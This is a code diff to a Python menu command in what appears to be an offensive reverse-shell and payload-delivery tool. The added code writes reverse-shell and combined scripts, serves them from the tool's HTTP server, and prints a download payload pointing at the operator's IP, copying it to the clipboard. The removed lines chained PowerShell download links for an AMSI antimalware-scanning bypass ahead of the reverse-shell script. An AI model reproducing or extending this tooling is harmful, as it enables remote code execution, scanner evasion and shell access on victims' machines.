@@ -1,7 +1,9 @@
 from commands.abstract_command import AbstractCommand
-from utils.pwsh_utils import PwshUtils
+from utils.minishh_utils import MinishhUtils
+from utils.pwsh_utils import PwshUtils, ObfUtil
 from utils.print_utils import Printer
 from config.config import AppConfig
+from http_handler.http_server import HttpDeliveringServer
 from prompt_toolkit.shortcuts import CompleteStyle
 from prompt_toolkit.completion import WordCompleter
 from prompt_toolkit import PromptSession
@@ -107,38 +109,41 @@ class MenuCommand(AbstractCommand):
 
             if inline_payload != "":
                 if self.generator.get_parser_val("output") == 'infile':
+                    section_target = AppConfig.translate_target_to_section(self.generator.get_parser_val("target").lower())
+                    # At this time, we requested an infile generated payload
+                    # Check if on_before_shell is set for the target (not usable with linux by now)
+                    script_content = []
+                    scripts = MinishhUtils.recover_scripts("on_before_shell", section_target)
+                    script_dest = MinishhUtils.recover_scripts("reverse_shell_script", section_target)[0]
+                    scripts.append(script_dest)
+                    for script in scripts:
+                        route = HttpDeliveringServer.get_route_for_script(script)
+                        script_content.append(
+                                self.generator.get_remote_payload_for_type(section_target,
+                                        AppConfig.get('port', 'HttpServer'),
+                                            route)
+                                )
+
+                    script_dest_all = MinishhUtils.recover_scripts("all_in_one_script", section_target)[0]
+                    if script_dest != "" and script_dest_all != "":
+                        with open(script_dest, "w") as rev_shell_script, open(script_dest_all, "w") as all_payload:
+                            rev_shell_script.write(self.generator.get_payload_for_type(section_target, self.generator.get_parser_val("tpl")))
+                            all_payload.write("\n".join(script_content))
+
+                    else:
+                        Printer.err("[red]Config value missing[/red] 'reverse_shell_script' in section {}".format(section_target))
+
                     download_payload = self.generator.generate_payload(self.full_cli,
-                    ip=AppConfig.get('default_ip_address'),
-                    port=AppConfig.get('listening_port', 'Connections'),
-                    route="test.log")
+                        ip=AppConfig.get('default_ip_address'),
+                        port=AppConfig.get('port', 'HttpServer'),
+                        route=HttpDeliveringServer.get_route_for_script(script_dest_all))
+
                     Printer.print(download_payload)
+                    MinishhUtils.copy(download_payload)
 
                 else:
                     Printer.print(inline_payload)
+                    MinishhUtils.copy(inline_payload)
 
         except Exception as e:
             Printer.err(e)
-
-        if AppConfig.get("auto_bypass_amsi", "Session").upper() == "Y":
-            payload += self.main_menu.http_server.download_link_powershell(
-                AppConfig.get("amsi_route1", "Routes")
-                ) + "\n"
-            payload += self.main_menu.http_server.download_link_powershell(
-                AppConfig.get("amsi_route2", "Routes")
-                ) + "\n"
-
-        payload += self.main_menu.http_server.prepare_rev_shell_script()
-
-        script_name = AppConfig.get("directory", "Script") + "/all_in_one.ps1"
-        with open(script_name, "w") as f:
-            f.write(payload)
-            
-        self.main_menu.http_server.add_permanent_route("super_test.log", script_name)
-
-        new_payload = self.main_menu.http_server.download_link_powershell("super_test.log")
-        # print(PwshUtils.make_pwsh_cmd(new_payload))
-
-        addr = AppConfig.get('default_ip_address')
-        addr += ":"
-        addr += AppConfig.get('listening_port', 'Connections')
-        # Printer.msg(f"Generated for {addr}")
